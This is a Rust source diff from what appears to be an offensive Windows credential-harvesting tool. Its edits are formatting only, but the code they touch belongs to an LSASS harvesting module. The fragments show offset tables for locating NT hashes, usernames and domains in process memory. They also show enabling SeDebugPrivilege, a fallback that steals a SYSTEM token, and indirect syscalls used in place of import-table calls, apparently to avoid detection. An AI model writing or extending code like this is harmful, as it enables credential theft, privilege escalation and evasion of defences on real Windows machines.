@@ -24,11 +24,11 @@
 
 #![cfg(windows)]
 
+use crate::win_types::HANDLE;
 use anyhow::{anyhow, Context, Result};
 use serde::Serialize;
 use std::ptr;
 use windows_sys::Win32::System::Threading::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
-use crate::win_types::HANDLE;
 
 use crate::nt_handle::NtHandle;
 
@@ -753,7 +753,8 @@ fn get_msv_offsets(build: u32) -> Option<(MsvOffsets, u32)> {
         // than the matched entry.  This handles cases like 22631→26100 (gap
         // 3469) where offsets are known to be identical.
         let family_extends = MSV_OFFSET_TABLE.iter().any(|&(b, offsets)| {
-            b > matched_build && offsets.primary_cred_offset == matched_offsets.primary_cred_offset
+            b > matched_build
+                && offsets.primary_cred_offset == matched_offsets.primary_cred_offset
                 && offsets.nt_hash_offset == matched_offsets.nt_hash_offset
                 && offsets.username_offset == matched_offsets.username_offset
                 && offsets.domain_offset == matched_offsets.domain_offset
@@ -969,7 +970,9 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
         }),
         Err(_) => {
             // Fall back: steal a SYSTEM token.
-            tracing::debug!("lsass_harvest: SeDebugPrivilege failed, attempting SYSTEM token theft");
+            tracing::debug!(
+                "lsass_harvest: SeDebugPrivilege failed, attempting SYSTEM token theft"
+            );
             crate::token_manipulation::get_system().context("failed to elevate to SYSTEM")?;
             Ok(PrivilegeContext {
                 debug_priv_enabled_by_us: false,
@@ -986,7 +989,9 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
 /// Uses indirect syscalls (NtOpenProcessToken, NtAdjustPrivilegesToken) and
 /// the static SeDebugPrivilege LUID instead of IAT imports.
 fn enable_debug_privilege() -> Result<bool> {
-    use windows_sys::Win32::Security::{LUID_AND_ATTRIBUTES, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY};
+    use windows_sys::Win32::Security::{
+        LUID_AND_ATTRIBUTES, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY,
+    };
 
     // SeDebugPrivilege LUID is always { LowPart: 20, HighPart: 0 } on all
     // Windows versions.  Using the static value avoids calling LookupPrivilegeValueW.
